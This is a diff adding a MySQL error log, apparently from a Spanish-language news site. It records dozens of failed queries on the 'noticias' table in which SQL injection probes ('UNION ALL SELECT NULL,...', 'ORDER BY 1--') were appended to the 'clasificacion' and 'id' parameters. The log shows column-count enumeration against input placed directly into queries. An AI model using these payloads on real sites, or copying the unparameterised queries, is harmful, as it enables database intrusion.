@@ -1,0 +1,563 @@
+Time : 10:42:37
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zXKH' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OxTU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OxTU
+
+Time : 10:42:36
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ylCW' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZjBW' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZjBW
+
+Time : 10:42:36
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- FVES' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:36
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zXYU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zXYU
+
+Time : 10:42:36
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- OWRy' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Niez' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Niez
+
+Time : 10:42:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- YqLk' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ZmsY' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ZmsY
+
+Time : 10:42:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yNMC' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:35
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yNTR' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- yNTR
+
+Time : 10:42:35
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL,NULL-- JWzO' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL-- zAfk' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL,NULL-- zAfk
+
+Time : 10:42:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL,NULL-- tZWV' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL-- CIvV' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL,NULL-- CIvV
+
+Time : 10:42:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL,NULL-- eqDK' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:34
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL-- ffrp' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL,NULL-- ffrp
+
+Time : 10:42:34
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local%' UNION ALL SELECT NULL-- oywc' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL-- mNMH' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' UNION ALL SELECT NULL-- mNMH
+
+Time : 10:42:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY 1-- LJVH' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220%' ORDER BY 1-- LJVH
+
+Time : 10:42:33
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- cePM' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:33
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- APkp' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- APkp
+
+Time : 10:42:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- CDSH' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bitP' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bitP
+
+Time : 10:42:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- KrYE' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hCMk' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- hCMk
+
+Time : 10:42:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- WfPD' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AGJF' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AGJF
+
+Time : 10:42:32
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- usIl' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- usIl
+
+Time : 10:42:32
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- LoEy' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- JCvZ' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- pZtW' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- pZtW
+
+Time : 10:42:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL,NULL-- XZVj' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL,NULL-- XZVj
+
+Time : 10:42:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL,NULL-- WIAp' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:31
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL,NULL-- mFYW' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL,NULL-- mFYW
+
+Time : 10:42:31
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL,NULL-- UDuo' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:30
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL,NULL-- jYBR' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL,NULL-- hYnz' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL,NULL-- hYnz
+
+Time : 10:42:30
+SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local' UNION ALL SELECT NULL-- fsuQ' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' UNION ALL SELECT NULL-- HeFO' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' UNION ALL SELECT NULL-- HeFO
+
+Time : 10:42:30
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' ORDER BY 1-- jFQM' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220' ORDER BY 1-- jFQM
+
+Time : 10:42:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYdh' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- wYdh
+
+Time : 10:42:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vnTs' ORD' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- vnTs' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AAoV' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- AAoV
+
+Time : 10:42:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- EnaY' ORDER BY' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- EnaY' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:29
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QRUp' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- QRUp
+
+Time : 10:42:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jNng' ORDER BY date' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- jNng' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oJdu' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- oJdu
+
+Time : 10:42:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Kzuo' ORDER BY date DESC' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- Kzuo' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- LEkM' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- LEkM
+
+Time : 10:42:28
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ubRj' ORDER BY date DESC LIMI' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- ubRj' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- GXHl' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- GXHl
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ptxF' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- ptxF' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL,NULL-- FYuT' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL,NULL-- FYuT
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL,NULL-- hXyM' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL,NULL-- hXyM' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL,NULL-- RACy' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL,NULL-- RACy
+
+Time : 10:42:27
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL,NULL-- fUIs' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL,NULL-- fUIs' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL,NULL-- BZPX' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL,NULL-- BZPX
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL,NULL-- sCGM' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL,NULL-- sCGM' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') UNION ALL SELECT NULL-- iYSP' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') UNION ALL SELECT NULL-- iYSP
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') UNION ALL SELECT NULL-- PfmC' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') UNION ALL SELECT NULL-- PfmC' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '') ORDER BY 1-- kBTU' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220') ORDER BY 1-- kBTU
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ') ORDER BY 1-- YzCj' ORDER BY date DESC LIMIT 0,7' at line 1
+Raw SQL : SELECT * FROM noticias WHERE clasificacion = 'local') ORDER BY 1-- YzCj' ORDER BY date DESC LIMIT 0,7
+
+Time : 10:42:26
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bMYW' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- bMYW
+
+Time : 10:42:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pegS' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- pegS
+
+Time : 10:42:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zYVb' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- zYVb
+
+Time : 10:42:25
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mjVi' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- mjVi
+
+Time : 10:42:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- UPrQ' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- UPrQ
+
+Time : 10:42:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- OCMF' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- OCMF
+
+Time : 10:42:24
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL-- Muwe' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL-- Muwe
+
+Time : 10:42:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL-- KfaY' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL-- KfaY
+
+Time : 10:42:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL-- phfO' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL-- phfO
+
+Time : 10:42:23
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL-- cXZM' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL-- cXZM
+
+Time : 10:42:22
+SQLSTATE[42S22]: Column not found: 1054 Unknown column '1' in 'order clause'
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 ORDER BY 1-- TzkS
+
+Time : 10:42:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JRLg' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- JRLg
+
+Time : 10:42:22
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tqvq' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- tqvq
+
+Time : 10:42:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eUnv' at line 1
+Raw SQL : UPDATE noticias SET `visitas` = `visitas`+1 WHERE id=10220 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- eUnv
+
+Time : 10:42:21
+SQLSTATE[42000]: Syntax error or access violation: 1064 You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- ZWGH' at line 1
